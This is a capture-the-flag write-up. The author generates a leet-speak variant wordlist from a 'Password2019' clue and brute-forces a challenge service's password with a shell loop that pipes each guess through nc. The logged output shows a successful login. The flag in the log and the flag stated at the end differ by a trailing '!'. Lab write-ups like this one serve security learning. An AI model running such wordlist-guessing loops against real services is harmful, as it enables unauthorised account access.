# Bonus 08

The network service at target.xxxxxx.co on port 9008 asks the user to authenticate. The user has previously used bad passwords like Password2019. They learned their lesson though and have picked a much more secure password. We think they might still be predictable and using some kind of hacker speak, or symbols. Get the password and get the points!

## Solution

The hard part is to create a wordlist from the `Password2019` clue and leet speak...
I built a python script to generate it and then tried it on the server.

```
# I generate all variation of the "password" in leet speak + a date at the end
$ python leet.py > dict.txt

# Here it's a sample of the dict
$ tail -10 dict.txt
PA$$WORd2020!
PA$$WORd2021!
PA$$WORD
PA$$WORD!
PA$$WORD2019
PA$$WORD2020
PA$$WORD2021
PA$$WORD2019!
PA$$WORD2020!
PA$$WORD2021!

# About 24576 possible passwords
$ wc -l dict.txt
24576 dict.txt

# Try this wordlist on the server
for pass in $(cat dict.txt); do echo $pass;  printf "$pass\n" | nc target.xxxxxx.co 9008; done  > cracked.log

$ grep -i succes cracked.log
Succesfully authenticated client.

$ grep -C5 "Succesfully authenticated client."" cracked.log 
PaSSw0rd2020!
Password required > 
Authentication failure. Goodbye.
PaSSw0rd2021!
Password required > 
Succesfully authenticated client.

W0RdMangl3KungFU
PaSSw0rD
Password required > 
Authentication failure. Goodbye.
```

Flag is `W0RdMangl3KungFU!`
